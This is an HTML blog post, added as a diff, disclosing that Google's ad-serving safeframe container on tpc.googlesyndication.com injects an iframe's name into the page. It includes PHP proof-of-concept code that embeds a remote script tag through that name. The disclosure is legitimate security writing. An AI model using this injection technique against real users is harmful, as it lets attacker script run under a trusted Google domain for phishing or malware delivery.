@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset=utf-8>
+
+<title>Embed any HTML into tpc.googlesyndication.com - Erik's Code</title>
+
+<meta name=keywords content="html xss cross site scripting tpc.googlesyndication.com google">
+<link rel="author" href="https://plus.google.com/+ErikDubbelboer" />
+
+
+<link href="/css/common.css" media="screen" rel="stylesheet" type="text/css">
+<link href="/css/pygments.css" media="screen" rel="stylesheet" type="text/css">
+</head>  
+<body>
+  <div id="main">
+    <div id="header-wrapper">
+      <div id="header" class="basic" >
+        <div class="site">
+          <a class="logo" href="/"><h2>Erik's Code</h2></a>
+          <div class="topsearch">
+            <ul class="nav logged_out">
+              <li><a href="/about.html">About Erik</a></li>
+            </ul>
+          </div><!-- .topsearch -->
+        </div><!-- .site -->
+      </div><!-- #header -->
+    </div><!-- #header-wrapper -->
+    <div id="wrapper">
+      <div id="content" class="site">
+
+        <h1>Embed any HTML into tpc.googlesyndication.com</h1>
+
+<em>Date: 10 Jun 2016</em><br>
+<em>Author: Erik Dubbelboer</em>
+
+<p>Google uses <a href="http://tpc.googlesyndication.com" target="_blank" rel="nofollow">tpc.googlesyndication.com</a> for its adserving. They basically allow anything to run on this domain. There is a container html file hosted on this domain which reads the name of the iframe and injects the name content into the page. We can use this to run anything we want on this google domain.</p>
+
+<p>Example php code:</p>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="nv">$html</span> <span class="o">=</span> <span class="s1">&#39;&lt;script src=&quot;http://dubbelboer.com/googlebug/exploit.js&quot;&gt;&lt;/script&gt;&#39;</span><span class="p">;</span>
+
+<span class="c1">// The format for the name needs to be &quot;1-0-1;&lt;length of content&gt;;&lt;content&gt;&quot;</span>
+<span class="k">echo</span> <span class="s1">&#39;&lt;iframe name=&quot;1-0-1;&#39;</span> <span class="o">.</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$html</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;;&#39;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$html</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s1">&#39; src=&quot;http://tpc.googlesyndication.com/safeframe/1-0-1/html/container.html&quot;&gt;&lt;/iframe&gt;&#39;</span><span class="p">;</span></code></pre></div>
+
+<p>This example can be found at <a href="http://dubbelboer.com/googlebug/index.php" target="_blank">http://dubbelboer.com/googlebug/index.php</a></p>
+
+<p>In my example <code>exploit.js</code> just contains an alert statement to show the domain. In theory this could contain any code.</p>
+
+<p>This has been reported to google but they said they don’t care what is run on the domain. I guess they never place any sensitive cookies on this domain and don’t expect others to do either.</p>
+
+
+
+<div id=disqus_thread></div>
+<script>
+  var disqus_shortname = 'erikscode';
+
+  (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+
+
+
+      </div><!-- #content -->
+    </div><!-- #wrapper -->
+  </div><!-- #main -->
+
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-7915266-3', 'dubbelboer.com');
+    ga('send', 'pageview');
+  </script>
+</body>
+</html>
